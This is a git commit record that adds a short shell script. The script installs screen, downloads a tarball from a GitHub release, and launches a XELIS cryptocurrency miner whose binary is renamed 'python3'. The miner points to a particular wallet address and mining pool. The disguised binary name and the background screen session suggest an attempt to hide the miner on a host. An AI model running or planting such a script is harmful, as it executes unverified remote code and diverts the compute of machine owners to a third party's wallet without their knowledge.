d9e50be07dd045f97125caccb76e1f8859f912d8
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-25 04:42:56 +0700

    Create dotxelis.sh

---
+++ dotxelis.sh
@@ -0,0 +1,7 @@
+apt install screen -y
+
+wget https://github.com/DotAja/ALONE/releases/download/alone/dotxelis.tar.gz
+
+tar -xvf dotxelis.tar.gz
+
+screen ./dotxelis/python3 -a xelis -w xel:qcd39a5u8cscztamjuyr7hdj6hh2wh9nrmhp86ljx2sz6t99ndjqzqq9qqqqq90uysarvz7kxkd.DOT -o sg.vipor.net:5077
